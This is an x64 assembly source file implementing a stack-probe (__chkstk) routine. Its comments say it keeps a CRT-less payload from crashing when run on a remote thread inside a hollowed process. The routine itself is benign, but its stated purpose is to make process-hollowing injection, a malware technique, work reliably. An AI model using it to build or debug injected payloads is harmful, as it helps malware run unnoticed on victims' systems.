; ==============================================================================
; chkstk.asm -- minimal x64 __chkstk for the CRT-less payload.
; /NODEFAULTLIB has no __chkstk, so build.bat used /Gs1048576 (no probes under
; 1MB). That let large frames (8-12KB) skip the stack guard page on the fresh
; remote thread of the hollowed process: the first access beyond it faults with
; no expansion, and the payload dies silently mid-extraction.
;
; MSVC x64 contract (confirmed in the emitted prologue):
;   mov eax, <frame bytes>
;   call __chkstk
;   sub rsp, rax          <- caller subtracts RAX, so EAX must survive
; The kernel only expands the stack when an access lands ON the current guard
; page, so we probe DESCENDING from rsp, one page at a time: every touch hits
; the next guard and shifts it down. Probing bottom-up would fault past the
; guard with no expansion. r10/r11 are volatile scratch; eax and rsp untouched.
; ==============================================================================
.code
__chkstk proc
    mov     r10, rsp          ; caller's rsp (committed region)
    mov     r11, r10
    sub     r11, rax          ; r11 = lowest address of the new frame
pl:
    sub     r10, 1000h        ; step one page down
    test    byte ptr [r10], al ; touch: on the guard page this expands it
    cmp     r10, r11
    ja      pl                ; keep going until we probed at or below the bottom
    ret
__chkstk endp
end
